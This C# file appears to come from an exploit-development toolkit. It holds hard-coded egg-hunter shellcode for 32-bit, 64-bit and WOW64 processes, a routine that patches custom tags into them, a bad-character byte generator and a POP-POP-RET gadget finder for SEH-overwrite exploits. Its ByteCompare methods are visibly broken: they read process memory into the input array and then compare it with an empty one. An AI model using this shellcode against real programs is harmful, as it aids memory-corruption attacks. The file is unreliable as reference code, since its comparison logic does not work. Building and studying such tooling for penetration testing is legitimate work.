﻿using System;
using System.Collections.Generic;
using System.IO;

namespace ERC.Utilities
{
    /// <summary>
    /// A collecton of methods which generate payloads.
    /// </summary>
    public static class Payloads
    {
        private static byte[] ByteArray = 
        {
            0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F,
            0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17, 0x18, 0x19, 0x1A, 0x1B, 0x1C, 0x1D, 0x1E, 0x1F,
            0x20, 0x21, 0x22, 0x23, 0x24, 0x25, 0x26, 0x27, 0x28, 0x29, 0x2A, 0x2B, 0x2C, 0x2D, 0x2E, 0x2F,
            0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39, 0x3A, 0x3B, 0x3C, 0x3D, 0x3E, 0x3F,
            0x40, 0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47, 0x48, 0x49, 0x4A, 0x4B, 0x4C, 0x4D, 0x4E, 0x4F,
            0x50, 0x51, 0x52, 0x53, 0x54, 0x55, 0x56, 0x57, 0x58, 0x59, 0x5A, 0x5B, 0x5C, 0x5D, 0x5E, 0x5F,
            0x60, 0x61, 0x62, 0x63, 0x64, 0x65, 0x66, 0x67, 0x68, 0x69, 0x6A, 0x6B, 0x6C, 0x6D, 0x6E, 0x6F,
            0x70, 0x71, 0x72, 0x73, 0x74, 0x75, 0x76, 0x77, 0x78, 0x79, 0x7A, 0x7B, 0x7C, 0x7D, 0x7E, 0x7F,
            0x80, 0x81, 0x82, 0x83, 0x84, 0x85, 0x86, 0x87, 0x88, 0x89, 0x8A, 0x8B, 0x8C, 0x8D, 0x8E, 0x8F,
            0x90, 0x91, 0x92, 0x93, 0x94, 0x95, 0x96, 0x97, 0x98, 0x99, 0x9A, 0x9B, 0x9C, 0x9D, 0x9E, 0x9F,
            0xA0, 0xA1, 0xA2, 0xA3, 0xA4, 0xA5, 0xA6, 0xA7, 0xA8, 0xA9, 0xAA, 0xAB, 0xAC, 0xAD, 0xAE, 0xAF,
            0xB0, 0xB1, 0xB2, 0xB3, 0xB4, 0xB5, 0xB6, 0xB7, 0xB8, 0xB9, 0xBA, 0xBB, 0xBC, 0xBD, 0xBE, 0xBF,
            0xC0, 0xC1, 0xC2, 0xC3, 0xC4, 0xC5, 0xC6, 0xC7, 0xC8, 0xC9, 0xCA, 0xCB, 0xCC, 0xCD, 0xCE, 0xCF,
            0xD0, 0xD1, 0xD2, 0xD3, 0xD4, 0xD5, 0xD6, 0xD7, 0xD8, 0xD9, 0xDA, 0xDB, 0xDC, 0xDD, 0xDE, 0xDF,
            0xE0, 0xE1, 0xE2, 0xE3, 0xE4, 0xE5, 0xE6, 0xE7, 0xE8, 0xE9, 0xEA, 0xEB, 0xEC, 0xED, 0xEE, 0xEF,
            0xF0, 0xF1, 0xF2, 0xF3, 0xF4, 0xF5, 0xF6, 0xF7, 0xF8, 0xF9, 0xFA, 0xFB, 0xFC, 0xFD, 0xFE, 0xFF,
        };

        #region Egg Hunters
        /// <summary>
        /// Default egg hunter tag.
        /// </summary>
        public static string DefaultEgg = "ERCD";

        /// <summary>
        /// A 64 bit egg hunter.
        /// </summary>
        public static byte[] EggHunter641 =
        {
            0x8C, 0xCB, 0x80, 0xFB, 0x23, 0x33, 0xD2, 0x66, 0x81, 0xCA, 0xFF, 0x0F, 0x33, 0xDB, 0x42, 0x52,
            0x53, 0x53, 0x53, 0x6A, 0x29, 0x58, 0xB3, 0xC0, 0x64, 0xFF, 0x13, 0x83, 0xC4, 0x0C, 0x5A, 0x3C,
            0x05, 0x74, 0xE4, 0xB8, 0x45, 0x52, 0x43, 0x44, 0x89, 0xD7, 0xAF, 0x75, 0xE1, 0xAF, 0x75, 0xDE,
            0xFF, 0xE7
        };

        /// <summary>
        /// A second 64 bit egg hunter.
        /// </summary>
        public static byte[] EggHunter642 =
        {
            0x54, 0x59, 0x48, 0x83, 0xc1, 0xff, 0x48, 0xff, 0xc1, 0x81, 0x79, 0xfc, 0x45, 0x52, 0x43, 0x44,
            0x75, 0xf4, 0xff, 0xe1
        };

        /// <summary>
        /// A 32 bit egg hunter.
        /// </summary>
        public static byte[] EggHunter32 =
        {
            0x66, 0x81, 0xca, 0xff, 0x0f, 0x42, 0x52, 0x6a, 0x02, 0x58, 0xcd, 0x2e, 0x3c, 0x05, 0x5a, 0x74,
            0xef, 0xb8, 0x45, 0x52, 0x43, 0x44, 0x8b, 0xfa, 0xaf, 0x75, 0xea, 0xaf, 0x75, 0xe7, 0xff, 0xe7
        };

        /// <summary>
        /// An egg hunter that will work on 32 bit systems or 32 bit processes running under WOW64.
        /// </summary>
        public static byte[] EggHunterWOW64 =
        {
            0x66, 0x8c, 0xcb, 0x80, 0xfb, 0x23, 0x75, 0x08, 0x31, 0xdb, 0x53, 0x53, 0x53, 0x53, 0xb3, 0xc0,
            0x66, 0x81, 0xca, 0xff, 0x0f, 0x42, 0x52, 0x80, 0xfb, 0xc0, 0x74, 0x19, 0x6a, 0x02, 0x58, 0xcd,
            0x2e, 0x5a, 0x3c, 0x05, 0x74, 0xea, 0xb8, 0x45, 0x52, 0x43, 0x44, 0x89, 0xd7, 0xaf, 0x75, 0xe5,
            0xaf, 0x75, 0xe2, 0xff, 0xe7, 0x6a, 0x26, 0x58, 0x31, 0xc9, 0x89, 0xe2, 0x64, 0xff, 0x13, 0x5e,
            0x5a, 0xeb, 0xdf
        };
        #endregion

        #region Byte Array Constructor
        /// <summary>
        /// Creates an array of all possible byte values except those passed to the function. 
        /// </summary>
        /// <param name="unwantedBytes">Takes a byte array of bytes to be excluded</param>
        /// <returns>Returns an array of all other possible bytes.</returns>
        public static byte[] ByteArrayConstructor(byte[] unwantedBytes)
        {
            byte[] bytes;
            if(unwantedBytes != null)
            {
                bytes = new byte[ByteArray.Length - unwantedBytes.Length];
            }
            else
            {
                bytes = new byte[ByteArray.Length];
            }
            int bytesCounter = 0;
            for(int i = 0; i < ByteArray.Length; i++)
            {
                bool addByte = true;
                if(unwantedBytes != null)
                {
                    for (int j = 0; j < unwantedBytes.Length; j++)
                    {
                        if (ByteArray[i].Equals(unwantedBytes[j]))
                        {
                            addByte = false;
                        }
                    }
                }
                if(addByte == true)
                {
                    bytes[bytesCounter] = ByteArray[i];
                    bytesCounter++;
                }
            }
            return bytes;
        }
        #endregion

        #region Egg Hunter Constructor
        /// <summary>
        /// Generates a selection of EggHunter payloads. A custom tag can be specified, if no tag is specified EggHunters will search for the default tag (ERCD)
        /// </summary>
        /// <param name="tag">A custom tag which the egg hunters will search for.</param>
        /// <returns>Returns a dictionary containing a list of EggHunters and string detailing them</returns>
        public static Dictionary<string, byte[]> EggHunterConstructor(string tag = null)
        {
            Dictionary<string, byte[]> eggHunters = new Dictionary<string, byte[]>();
            string eggHunter641Description = "64 Bit Egg Hunter 1:" + Environment.NewLine +
                "Usage: To be used on 64 bit processes running on 64 bit systems only, not on 32 bit processes running on a 64 bit system." + Environment.NewLine;
            string eggHunter642Description = "64 Bit Egg Hunter 2:" + Environment.NewLine +
                "Usage: To be used on 64 bit processes running on 64 bit systems only, not on 32 bit processes running on a 64 bit system." + Environment.NewLine;
            string eggHunter32Description = "32 Bit Egg Hunter:" + Environment.NewLine + 
                "Usage: To be used on 32 bit systems only, not on 32 bit processes running on a 64 bit system." + Environment.NewLine;
            string eggHunterWOW64Description = "WOW64 Egg Hunter:" + Environment.NewLine +
                "Usage: To be used on 32 bit processes running on a 64 bit system. Can also be used on 32 bit systems." + Environment.NewLine;
            if (tag != null)
            {
                if (tag.Length != 4)
                {
                    tag = null;
                }
            }

            if (tag != null)
            {
                byte[] bytes1 = new byte[EggHunter641.Length];
                Array.Copy(EggHunter641, 0, bytes1, 0, 36);
                bytes1[36] = (byte)tag[0];
                bytes1[37] = (byte)tag[1];
                bytes1[38] = (byte)tag[2];
                bytes1[39] = (byte)tag[3];
                Array.Copy(EggHunter641, 40, bytes1, 40, EggHunter641.Length - 40);
                eggHunters.Add(eggHunter641Description, bytes1);//Change this to be a description of the egghunter and where to use it

                byte[] bytes2 = new byte[EggHunter642.Length];
                Array.Copy(EggHunter642, 0, bytes2, 0, 12);
                bytes2[12] = (byte)tag[0];
                bytes2[13] = (byte)tag[1];
                bytes2[14] = (byte)tag[2];
                bytes2[15] = (byte)tag[3];
                Array.Copy(EggHunter642, 16, bytes2, 16, EggHunter642.Length - 16);
                eggHunters.Add(eggHunter642Description, bytes2);//Change this to be a description of the egghunter and where to use it

                byte[] bytes3 = new byte[EggHunter32.Length];
                Array.Copy(EggHunter32, 0, bytes3, 0, 18);
                bytes3[18] = (byte)tag[0];
                bytes3[19] = (byte)tag[1];
                bytes3[20] = (byte)tag[2];
                bytes3[21] = (byte)tag[3];
                Array.Copy(EggHunter32, 22, bytes3, 22, EggHunter32.Length - 22);
                eggHunters.Add(eggHunter32Description, bytes3);//Change this to be a description of the egghunter and where to use it

                byte[] bytes4 = new byte[EggHunterWOW64.Length];
                Array.Copy(EggHunterWOW64, 0, bytes4, 0, 39);
                bytes4[39] = (byte)tag[0];
                bytes4[40] = (byte)tag[1];
                bytes4[41] = (byte)tag[2];
                bytes4[42] = (byte)tag[3];
                Array.Copy(EggHunterWOW64, 43, bytes4, 43, EggHunterWOW64.Length - 43);
                eggHunters.Add(eggHunterWOW64Description, bytes4);//Change this to be a description of the egghunter and where to use it
            }
            else
            {
                eggHunters.Add(eggHunter641Description, EggHunter641);
                eggHunters.Add(eggHunter642Description, EggHunter642);
                eggHunters.Add(eggHunter32Description, EggHunter32);
                eggHunters.Add(eggHunterWOW64Description, EggHunterWOW64);
            }
            return eggHunters;
        }
        #endregion

        #region SEH Hop Search
        /// <summary>
        /// Finds all instances of POP X POP X RET in a given byte array. 
        /// </summary>
        /// <param name="data">Byte array to be searched</param>
        /// <returns>Returns an array of integers containing the offsets of the instruction sets.</returns>
        public static List<int> PopPopRet(byte[] data)
        {
            List<int> locations = new List<int>();
            List<byte[]> assemblies = new List<byte[]>();
            byte[] R8 = new byte[] { 0x58, 0x41 };
            byte[] R9 = new byte[] { 0x59, 0x41 };
            byte[] R10 = new byte[] { 0x5A, 0x41 };
            byte[] R11 = new byte[] { 0x5B, 0x41 };
            byte[] R12 = new byte[] { 0x5C, 0x41 };
            byte[] R13 = new byte[] { 0x5D, 0x41 };
            byte[] R14 = new byte[] { 0x5E, 0x41 };
            byte[] R15 = new byte[] { 0x5F, 0x41 };
            assemblies.Add(BitConverter.GetBytes(0xC3));
            assemblies.Add(BitConverter.GetBytes(0x58));
            assemblies.Add(BitConverter.GetBytes(0x5D));
            assemblies.Add(BitConverter.GetBytes(0x59));
            assemblies.Add(BitConverter.GetBytes(0x5A));
            assemblies.Add(BitConverter.GetBytes(0x5C));
            assemblies.Add(BitConverter.GetBytes(0x5D));
            assemblies.Add(BitConverter.GetBytes(0x5E));
            assemblies.Add(BitConverter.GetBytes(0x5F));
            assemblies.Add(R8);
            assemblies.Add(R9);
            assemblies.Add(R10);
            assemblies.Add(R11);
            assemblies.Add(R12);
            assemblies.Add(R13);
            assemblies.Add(R14);
            assemblies.Add(R15);
            assemblies.Add(BitConverter.GetBytes(0x5F));
            assemblies.Add(BitConverter.GetBytes(0x5E));
            assemblies.Add(BitConverter.GetBytes(0x5B));
            assemblies.Add(BitConverter.GetBytes(0x5A));
            assemblies.Add(BitConverter.GetBytes(0x59));
            assemblies.Add(BitConverter.GetBytes(0x58));
            assemblies.Add(BitConverter.GetBytes(0x5D));
            assemblies.Add(BitConverter.GetBytes(0x5C));
            for(int i = 2; i < data.Length; i++)
            {
                bool complete = false;
                if (data[i].Equals(assemblies[0][0]))
                {
                    for(int j = 1; j < assemblies.Count; j++)
                    {
                        if(data[i - 1].Equals(assemblies[j][0]))
                        {
                            if (assemblies[j].Length < 4)
                            {
                                for (int k = 1; k < assemblies.Count; k++)
                                {
                                    if (data[i - 2].Equals(assemblies[k][0]) && assemblies[k].Length < 4 && complete == false)
                                    {
                                        locations.Add(i - 2);
                                        complete = true;
                                    }
                                    else if(data[i - 2].Equals(assemblies[k][0]))
                                    {
                                        if (data[i - 3].Equals(0x41) && complete == false)
                                        {
                                            locations.Add(i - 3);
                                            complete = true;
                                        }
                                    }
                                }
                            }
                            else
                            {
                                if (data[i - 2].Equals(0x41))
                                {
                                    for (int k = 1; k < assemblies.Count; k++)
                                    {
                                        if (data[i - 3].Equals(assemblies[k][0]) && complete == false) 
                                        {
                                            if(assemblies[k].Length < 4)
                                            {
                                                locations.Add(i - 3);
                                                complete = true;
                                            }
                                            else if(assemblies[k].Length == 4 && data[i - 4].Equals(0x41) && complete == false)
                                            {
                                                locations.Add(i - 4);
                                                complete = true;
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
            return locations;
        }
        #endregion

        #region Byte Array Compare
        /// <summary>
        /// Compares a byte array with an area in memory of equal size. This method should be used in conjunction with the ByteArrayConstructor to identify 
        /// bytes which can not be passed into a program without corrupting the input.
        /// </summary>
        /// <param name="info">The process to compare memory from</param>
        /// <param name="startAddress">The address at which to start the comparison</param>
        /// <param name="bytes">The byte array containing the bytes to be compared</param>
        /// <returns>Returns a Tuple containing a bool which is true if the comparison was identical and false if it was not, a byte array containing 
        /// the bytes provided and a byte array containing the bytes read from process memory</returns>
        public static Tuple<bool, byte[], byte[]> ByteCompare(ProcessInfo info, IntPtr startAddress, byte[] bytes)
        {
            byte[] memoryBytes = new byte[bytes.Length];
            ErcCore.ReadProcessMemory(info.ProcessHandle, startAddress, bytes, bytes.Length, out int bytesRead);
            for(int i = 0; i < bytes.Length; i++)
            {
                if(bytes[i] != memoryBytes[i])
                {
                    return Tuple.Create(false, bytes, memoryBytes);
                }
            }
            return Tuple.Create(true, bytes, memoryBytes);
        }

        /// <summary>
        /// Compares a byte array with an area in memory of equal size. This method should be used in conjunction with the ByteArrayConstructor to identify 
        /// bytes which can not be passed into a program without corrupting the input.
        /// </summary>
        /// <param name="info">The process to compare memory from</param>
        /// <param name="startAddress">The address at which to start the comparison</param>
        /// <param name="byteFilePath">The path to a file containing the bytes to be compared</param>
        /// <returns>Returns a Tuple containing a bool which is true if the comparison was identical and false if it was not, a byte array containing 
        /// the bytes provided and a byte array containing the bytes read from process memory</returns>
        public static Tuple<bool, byte[], byte[]> ByteCompare(ProcessInfo info, IntPtr startAddress, string byteFilePath)
        {
            if (File.Exists(byteFilePath))
            {
                byte[] bytes = File.ReadAllBytes(byteFilePath);
                byte[] memoryBytes = new byte[bytes.Length];
                ErcCore.ReadProcessMemory(info.ProcessHandle, startAddress, bytes, bytes.Length, out int bytesRead);
                for (int i = 0; i < bytes.Length; i++)
                {
                    if (bytes[i] != memoryBytes[i])
                    {
                        return Tuple.Create(false, bytes, memoryBytes);
                    }
                }
                return Tuple.Create(true, bytes, memoryBytes);
            }
            else
            {
                throw new FileNotFoundException(byteFilePath);
            }
        }
        #endregion
    }
}
